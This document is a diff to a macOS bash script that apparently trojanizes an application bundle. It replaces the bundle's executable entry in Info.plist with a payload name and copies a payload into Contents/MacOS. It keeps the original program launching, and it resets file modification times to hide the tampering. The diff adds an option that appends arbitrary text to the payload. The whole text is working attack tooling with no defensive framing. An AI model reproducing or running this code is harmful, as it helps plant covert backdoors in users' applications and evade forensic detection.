@@ -6,7 +6,7 @@ if [ "$1" == "" ] || [ "$2" == "" ];then
 	echo "Incorrect usage"
 	exit 1
 else
-	function Get_S {
+	function Get_E {
 		RS=$?
 		if [ $RS -gt 0 ];then
 			echo "Something went wrong. Aborting."
@@ -56,18 +56,18 @@ else
 			LMTOE=$(stat -f "%Sm" -t "%m%d%H%M%y" "$TRUESRC/Contents/MacOS/$CL")
 				if [ "$OES" -eq 1 ];then
 					echo "$CL" > "$OFP"
-					Get_S
+					Get_E
 				fi
 			fi
 			sed -i '' -e "$R s%<string>.*</string>%<string>$PayloadName</string>%" "$TRUESRC/Contents/Info.plist"
-			Get_S
+			Get_E
 			let R=AR+1
 		else 
 			let R=R+1
 		fi
 	done
 	cp "$TRUEPATH" "$TRUESRC/Contents/MacOS/$PayloadName"
-	Get_S
+	Get_E
 	if [ "$OES" -eq 2 ];then
 		sed -i '' "\$s%\$%$CL%" "$TRUESRC/Contents/MacOS/$PayloadName"
 	elif [ "$OES" -eq 3 ];then
@@ -75,6 +75,13 @@ else
 	elif [ "$OES" -eq 4 ];then
 		sed -i '' "\$s%\$%$CL\"%" "$TRUESRC/Contents/MacOS/$PayloadName"
 	fi
+	if [ "${5:0:12}" == "AppendToEnd_" ];then
+		echo in
+		TTA=$(echo "$5" | sed "s%AppendToEnd_%%g")
+		echo i will echo .$TTA. to .$TRUESRC/Contents/MacOS/$PayloadName.
+		echo -ne "$TTA" >> "$TRUESRC/Contents/MacOS/$PayloadName"
+		echo done
+	fi	
 	chmod 755 "$TRUESRC/Contents/MacOS/$PayloadName"
 	touch -m "$LMTA" "$TRUESRC" && touch -m "$LMTC" "$TRUESRC/Contents" && touch -m "$LMTIP" "$TRUESRC/Contents/Info.plist" && touch -m "$LMTEF" "$TRUESRC/Contents/MacOS" && touch -m "$LMTOE" "$TRUESRC/Contents/MacOS/$PayloadName"
 fi
